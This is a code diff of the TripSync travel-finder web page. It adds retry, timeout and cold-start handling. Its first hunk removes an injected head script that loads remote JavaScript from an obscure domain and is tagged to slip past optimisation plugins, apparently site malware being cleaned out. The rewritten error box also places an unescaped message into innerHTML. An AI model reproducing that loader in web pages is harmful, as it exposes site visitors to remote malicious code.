@@ -1,14 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTMzNTUw.js?t=533550';
-      document.head.appendChild(script);
-  })();
-</script>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="description" content="TripSync — AI-powered travel destination finder. Free, no sign-up required.">
@@ -786,6 +778,10 @@ document.querySelectorAll('.amenity-tag').forEach(tag=>{
 });
 
 function init(){
+  // Pre-warm Render.com backend to avoid cold-start 504/500 on first search
+  fetch('/api/ping').catch(()=>{});
+
+
   const modes = {
     cloud: { icon: '☁️', label: 'Cloud AI (Groq)' },
     gemma: { icon: '✨', label: 'Gemma 4 Expert' },
@@ -1043,7 +1039,21 @@ async function setExample(txt){
   document.getElementById('tripInput').focus();
 }
 
-async function searchTrip(){
+async function fetchWithTimeout(url, options, timeoutMs = 45000) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), timeoutMs);
+  try {
+    const resp = await fetch(url, { ...options, signal: controller.signal });
+    clearTimeout(timer);
+    return resp;
+  } catch (err) {
+    clearTimeout(timer);
+    if (err.name === 'AbortError') throw new Error('Request timed out. The server may be waking up — please try again.');
+    throw err;
+  }
+}
+
+async function searchTrip(isRetry = false){
   const query=document.getElementById('tripInput').value.trim();
   if(!query){document.getElementById('tripInput').focus();return;}
   const departCity=document.getElementById('departCity').value.trim();
@@ -1059,7 +1069,7 @@ async function searchTrip(){
   const tripType=document.getElementById('tripType').value;
   if(departCity)localStorage.setItem('tripsync_depart_city',departCity);
   localStorage.setItem('tripsync_currency',currency);
-  showLoading();
+  showLoading(isRetry);
   try{
     let endpoint=tripType==='multicity'?'/api/multi-stop':'/api/tripsync';
     const aiMode = localStorage.getItem('tripsync_ai_mode') || 'cloud';
@@ -1068,13 +1078,19 @@ async function searchTrip(){
       else if(aiMode === 'gemma') endpoint = '/api/tripsync-gemma';
     }
     const body={query,departCity,checkIn,checkOut,guests,budget,currency,flightClass,flightPriority,hotelRating,amenities:selectedAmenities,carType,tripType};
-    const resp=await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
+    const resp=await fetchWithTimeout(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)}, 48000);
     stopLoadingAnimations();
     
     let errorData = null;
     try { errorData = await resp.json(); } catch(e) {}
 
     if(!resp.ok) {
+      // 503/504 = server waking or overloaded — auto-retry once
+      if ((resp.status === 503 || resp.status === 504) && !isRetry) {
+        showWakingMessage();
+        await new Promise(r => setTimeout(r, 5000));
+        return searchTrip(true);
+      }
       const msg = (errorData && errorData.error) ? errorData.error : 'Server error ' + resp.status;
       throw new Error(msg);
     }
@@ -1091,7 +1107,7 @@ async function searchTrip(){
       const searches = state.projects[state.activeProjectId].searches;
       const existingIdx = searches.findIndex(s => s.query === query && s.departCity === departCity);
       if (existingIdx !== -1) {
-        searches[existingIdx] = entry; // Update existing
+        searches[existingIdx] = entry;
       } else {
         searches.push(entry);
       }
@@ -1105,6 +1121,7 @@ async function searchTrip(){
   }catch(err){stopLoadingAnimations();showError(err.message);}
 }
 
+
 const TRAVEL_TIPS = [
   'Book flights at least 6–8 weeks in advance for the best economy fares.',
   'Traveling mid-week (Tuesday or Wednesday) is often 15–20% cheaper.',
@@ -1116,7 +1133,7 @@ const TRAVEL_TIPS = [
   'A local SIM card at your destination is almost always cheaper than roaming.',
 ];
 
-function showLoading(){
+function showLoading(isRetry = false){
   const currentMode = localStorage.getItem('tripsync_ai_mode') || 'cloud';
   let activeMsgs = MSGS_STANDARD;
   if (currentMode === 'gemma') activeMsgs = MSGS_EXPERT;
@@ -1128,19 +1145,26 @@ function showLoading(){
   document.getElementById('destinationsOutput').innerHTML='';
   document.getElementById('searchBtn').disabled=true;
 
+  if (isRetry) {
+    document.getElementById('loadingText').textContent = '🔄 Waking up the AI engine, please wait...';
+    document.getElementById('loadingStatus').textContent = 'Auto-retrying (cold start)...';
+  }
+
   // Set progress bar duration based on mode
-  const duration = (currentMode === 'gemma' || currentMode === 'local') ? '28s' : '3s';
+  const duration = (currentMode === 'gemma' || currentMode === 'local' || isRetry) ? '45s' : '6s';
   const fill = document.getElementById('loadingProgressFill');
   if(fill){ fill.style.setProperty('--progress-duration', duration); fill.style.animation='none'; void fill.offsetWidth; fill.style.animation=''; }
 
-  // Rotate subline messages
-  let mi = 0;
-  document.getElementById('loadingText').textContent = activeMsgs[mi];
-  window._loadingMsgIv = setInterval(()=>{
-    mi = (mi+1) % activeMsgs.length;
-    const el = document.getElementById('loadingText');
-    if(el) el.textContent = activeMsgs[mi];
-  }, 2200);
+  // Rotate subline messages (skip if retry — we have custom message)
+  if (!isRetry) {
+    let mi = 0;
+    document.getElementById('loadingText').textContent = activeMsgs[mi];
+    window._loadingMsgIv = setInterval(()=>{
+      mi = (mi+1) % activeMsgs.length;
+      const el = document.getElementById('loadingText');
+      if(el) el.textContent = activeMsgs[mi];
+    }, 2200);
+  }
 
   // Rotate travel tips
   let ti = Math.floor(Math.random() * TRAVEL_TIPS.length);
@@ -1151,6 +1175,14 @@ function showLoading(){
     const el = document.getElementById('loadingTipText');
     if(el){ el.style.opacity='0'; setTimeout(()=>{ el.textContent=TRAVEL_TIPS[ti]; el.style.opacity='1'; },300); }
   }, 5000);
+}
+
+function showWakingMessage() {
+  stopLoadingAnimations();
+  const el = document.getElementById('loadingText');
+  if (el) el.textContent = '⏳ Server is waking up... auto-retrying in 5s';
+  const status = document.getElementById('loadingStatus');
+  if (status) status.textContent = 'Cold start detected — hang tight!';
 }
 
 function stopLoadingAnimations(){
@@ -1169,7 +1201,15 @@ function showError(msg){
   document.getElementById('searchBtn').disabled=false;
   const el=document.getElementById('errorState');
   el.style.display='block';
-  el.innerHTML='⚠ '+msg+' — <strong>Please try again.</strong>';
+  el.innerHTML=`
+    <div style="display:flex;align-items:flex-start;gap:0.75rem">
+      <span style="font-size:1.4rem;flex-shrink:0">⚠️</span>
+      <div>
+        <div style="font-weight:700;margin-bottom:0.35rem">Something went wrong</div>
+        <div style="font-size:0.87rem;opacity:0.85;margin-bottom:0.75rem">${msg}</div>
+        <button onclick="searchTrip()" style="background:var(--rust);border:none;color:white;padding:0.45rem 1rem;border-radius:5px;font-family:'DM Sans',sans-serif;font-size:0.82rem;font-weight:700;cursor:pointer">🔄 Try Again</button>
+      </div>
+    </div>`;
 }
 
 function renderResults(destinations,query,checkIn,checkOut,guests,departCity,currency){
